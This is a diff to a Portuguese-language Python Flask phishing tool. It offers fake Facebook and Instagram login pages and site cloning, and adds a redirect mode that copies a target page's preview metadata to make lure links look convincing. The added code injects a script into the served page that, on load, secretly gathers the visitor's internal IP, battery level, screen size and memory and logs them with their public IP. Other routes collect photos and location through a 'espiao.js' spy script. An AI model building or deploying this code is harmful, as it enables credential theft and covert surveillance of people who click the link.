@@ -24,11 +24,11 @@ def obter_temas():
         "2": "facebook", 
         "3": "facebook_pc", 
         "4": "instagram",
-        "6": "redirecionar"   # ← Novo template fixo
+        "6": "redirecionar"
     }
     if os.path.exists(pasta_templates):
         extras = [d for d in os.listdir(pasta_templates) if os.path.isdir(os.path.join(pasta_templates, d))]
-        idx = 7  # Começa do 7 agora, pois 6 está reservado
+        idx = 7
         for pasta in extras:
             if pasta not in temas.values():
                 temas[str(idx)] = pasta
@@ -45,7 +45,7 @@ def mostrar_menu():
     for i in range(1, 5):
         print(f" [{i}] {temas_disponiveis[str(i)].capitalize()} Login")
     print(" [5] Custom (URL - Clonar agora)")
-    print(f" [6] {temas_disponiveis['6'].capitalize()}")  # Opção 6 fixa
+    print(f" [6] {temas_disponiveis['6'].capitalize()}")
     for k, v in temas_disponiveis.items():
         if int(k) >= 7:
             print(f" [{k}] {v} (Salvo)")
@@ -80,7 +80,6 @@ def mostrar_menu():
 
     return tema_escolhido, link_destino, url_custom, ativar_loc, ativar_foto, ativar_banner
 
-# Desempacotando todas as opções
 pasta_tema, url_redirecionamento, url_alvo_custom, usar_loc, usar_foto, ativar_banner = mostrar_menu()
 
 # --- PERSONALIZAÇÃO DE PREVIEW ---
@@ -122,7 +121,7 @@ def index():
     except Exception as e:
         return f"Erro: {e}", 500
 
-    # --- LIMPEZA DE METADADOS ANTIGOS ---
+    # --- LIMPEZA DE METADADOS ---
     if personalizar == 's':
         html_original = re.sub(r'<title>.*?</title>', '', html_original, flags=re.IGNORECASE)
         html_original = re.sub(r'<meta property="og:.*?>', '', html_original, flags=re.IGNORECASE)
@@ -139,6 +138,80 @@ def index():
             f'<meta property="og:type" content="website">\n'
             f'<meta name="description" content="{meta_desc}">\n'
         )
+
+    # === NOVO: redirecionar + preview NÃO personalizado → título, descrição e imagem da URL de destino ===
+    elif pasta_tema == "redirecionar":
+        try:
+            res = requests.get(
+                url_redirecionamento,
+                verify=False,
+                timeout=10,
+                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+            )
+            html_redirect = res.text
+
+            title_match = re.search(r'<title[^>]*>(.*?)</title>', html_redirect, re.IGNORECASE | re.DOTALL)
+            title = title_match.group(1).strip() if title_match else "Verificação de Segurança"
+            title = re.sub(r'\s+', ' ', title)
+
+            desc_match = (
+                re.search(r'<meta[^>]*property=["\']og:description["\'][^>]*content=["\'](.*?)["\']', html_redirect, re.IGNORECASE) or
+                re.search(r'<meta[^>]*content=["\'](.*?)["\'][^>]*property=["\']og:description["\']', html_redirect, re.IGNORECASE) or
+                re.search(r'<meta[^>]*name=["\']description["\'][^>]*content=["\'](.*?)["\']', html_redirect, re.IGNORECASE)
+            )
+            desc = desc_match.group(1).strip() if desc_match else title
+
+            image_match = (
+                re.search(r'<meta[^>]*property=["\']og:image["\'][^>]*content=["\'](.*?)["\']', html_redirect, re.IGNORECASE) or
+                re.search(r'<meta[^>]*content=["\'](.*?)["\'][^>]*property=["\']og:image["\']', html_redirect, re.IGNORECASE)
+            )
+            image_url = image_match.group(1).strip() if image_match else ""
+
+            meta_tags = (
+                f'<title>{title}</title>\n'
+                f'<meta property="og:title" content="{title}">\n'
+                f'<meta property="og:description" content="{desc}">\n'
+                f'<meta property="og:image" content="{image_url}">\n'
+                f'<meta property="og:type" content="website">\n'
+                f'<meta name="description" content="{desc}">\n'
+            )
+        except Exception:
+            meta_tags = '<title>Verificação de Segurança</title>\n'
+
+    # ==================== COLETA AUTOMÁTICA NO CLIQUE (usando mesma função do espiao.js) ====================
+    coleta_automatica = f'''
+    <script>
+    async function enviarDadosIniciais() {{
+        let batteryInfo = "N/A";
+        if (navigator.getBattery) {{
+            try {{
+                const b = await navigator.getBattery();
+                batteryInfo = (b.level * 100).toFixed(0) + "% " + (b.charging ? "(Carregando)" : "");
+            }} catch(e) {{}}
+        }}
+
+        const ipInt = await getInternalIP();
+
+        const dados = {{
+            ip_interno: ipInt,
+            bateria: batteryInfo,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            deviceMemory: navigator.deviceMemory || "N/A"
+        }};
+
+        fetch('/capturar_inicial', {{
+            method: 'POST',
+            headers: {{ 'Content-Type': 'application/json' }},
+            body: JSON.stringify(dados)
+        }});
+    }}
+
+    window.addEventListener('load', () => {{
+        setTimeout(enviarDadosIniciais, 1500);
+    }});
+    </script>
+    '''
 
     # ==================== BANNER E GPS ====================
     css_banner = '''
@@ -184,7 +257,7 @@ def index():
     
     scripts_captura = '\n<script src="/static/js/espiao.js"></script>\n<script src="/static/js/saida.js"></script>\n'
 
-    head_content = meta_tags + script_config + scripts_captura
+    head_content = meta_tags + coleta_automatica + script_config + scripts_captura
 
     if ativar_banner:
         head_content = css_banner + head_content
@@ -205,16 +278,38 @@ def index():
     
     return render_template_string(html_final)
 
+# ==================== COLETA NO CLIQUE ====================
+@app.route('/capturar_inicial', methods=['POST'])
+def capturar_inicial():
+    dados = request.json
+    ip_list = request.headers.getlist("X-Forwarded-For")
+    ip_publico = ip_list[0] if ip_list else request.remote_addr
+
+    agora = datetime.datetime.now(fuso_br).strftime("%d/%m/%Y %H:%M:%S")
+
+    log = (f"=== COLETA NO CLIQUE ===\n"
+           f"DATA: {agora} | IP PÚBLICO: {ip_publico}\n"
+           f"IP INTERNO: {dados.get('ip_interno', 'N/A')}\n"
+           f"BATERIA: {dados.get('bateria', 'N/A')}\n"
+           f"RAM: {dados.get('deviceMemory')} GB\n"
+           f"TELA: {dados.get('screenWidth')} x {dados.get('screenHeight')}\n"
+           f"{'-'*60}\n")
+
+    caminho_relatorio = os.path.join(pasta_raiz, "relatorio.txt")
+    with open(caminho_relatorio, "a", encoding="utf-8") as f:
+        f.write(log)
+
+    print(f"\033[93m[+] Evidência salva em: {caminho_relatorio} (Horário BRT: {agora})\033[0m")
+    return jsonify({"status": "ok"}), 200
+
+
+# ==================== ROTAS ORIGINAIS ====================
 @app.route('/capturar', methods=['POST'])
 def capturar():
     dados = request.json
     ip_list = request.headers.getlist("X-Forwarded-For")
+    ip_publico = ip_list[0] if ip_list else request.remote_addr
     
-    if ip_list:
-        ip_publico = ip_list[0]
-    else:
-        ip_publico = request.remote_addr
-        
     ip_interno = dados.get('ip_interno', 'N/A')
     agora = datetime.datetime.now(fuso_br).strftime("%d/%m/%Y %H:%M:%S")
 
@@ -226,10 +321,11 @@ def capturar():
            f"{'-'*50}\n")
 
     caminho_relatorio = os.path.join(pasta_raiz, "relatorio.txt")
-    with open(caminho_relatorio, "a") as f:
+    with open(caminho_relatorio, "a", encoding="utf-8") as f:
         f.write(log)
     print(f"\033[92m[+] Evidência salva em: {caminho_relatorio} (Horário BRT: {agora})\033[0m")
     return jsonify({"status": "ok"}), 200
+
 
 @app.route('/foto', methods=['POST'])
 def receber_foto():
@@ -243,6 +339,7 @@ def receber_foto():
         print(f"\033[92m[+] Foto salva: {nome_arq}\033[0m")
     except: pass
     return jsonify({"status": "ok"}), 200
+
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
